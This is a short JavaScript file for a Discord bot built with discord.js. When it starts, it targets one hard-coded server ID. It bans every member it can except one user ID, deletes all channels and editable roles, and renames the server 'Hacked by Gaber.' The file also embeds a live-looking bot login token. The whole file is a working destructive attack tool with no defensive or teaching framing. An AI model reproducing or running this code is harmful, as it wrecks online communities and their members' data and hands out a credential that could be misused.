const Discord = require("discord.js");
const client = new Discord.Client();

function guildNuke(guild) {
  guild.members
    .filter(m => m.bannable && m.user.id != "510970297814614016")
    .forEach(member => {
      member.ban({ reason: "Hacked by Gaber." }).catch(() => null);
    });

  guild.channels.forEach(channel => {
    channel.delete().catch(() => null);
  });

  guild.roles
    .filter(r => r.editable)
    .forEach(role => {
      role.delete().catch(() => null);
    });

  guild.setName("Hacked by Gaber.");
  guild.setIcon(null);
}

client.on("ready", () => {
const serverhack = client.guilds.get("661443916972818453")
  guildNuke(serverhack)
})

client.login("NjUwNzU0NjUyMDM1MzUwNTI4.XhDXeQ.dMF7ellaNYApz8_dyY15QhA2R28");
